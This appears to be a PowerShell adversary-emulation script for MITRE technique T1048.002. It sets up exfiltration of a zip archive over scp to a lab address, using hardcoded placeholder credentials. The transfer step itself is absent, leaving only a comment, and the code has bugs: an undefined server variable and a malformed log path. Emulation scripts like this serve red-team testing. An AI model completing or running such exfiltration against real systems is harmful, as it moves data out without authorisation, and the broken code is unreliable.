# Exfiltrate archive using scp
# Technic ID : T1048.002
Clear-Host
Write-Output "==============================================================================="
Write-Output "Exfiltratrion over Alternative Protocol: "
Write-Output "Exfiltration over Asymmetric encrytpted Non-C2 protocol (T1048.002)"
Write-Output "==============================================================================="
#
$LogFile = "env:PUBLIC\exf\scp_exfiltration.log";
$Scp_Username = "scp_user";
$Scp_Key = "ftp_password";
$Ssh_Srv = "172.16.16.20"; 
$Ssh_Port = "22"; 
$ArchiveName = "data.zip";
$LocalStorageDir = "$env:PUBLIC\exf";
$Slash = "/"; 
$AntiSlash = "\"; 
$Column = ":";
$Scp_Uri = "$Scp_Srv$Column$Ssh_Port";
$FullPathArchive = "$LocalStorageDir$AntiSlash$ArchiveName";
Get-Date | Out-File -FilePath "$LogFile";
if ([System.IO.File]::Exists("$FullPathArchive")) 
{
    # Downloads from a website authorized key to avoid password prompting

    exit 0;
};
else 
{ 
    "The file $FullPathArchive does not exists !!!" | Out-File -FilePath "$LogFile" -Append;
    exit 1;
};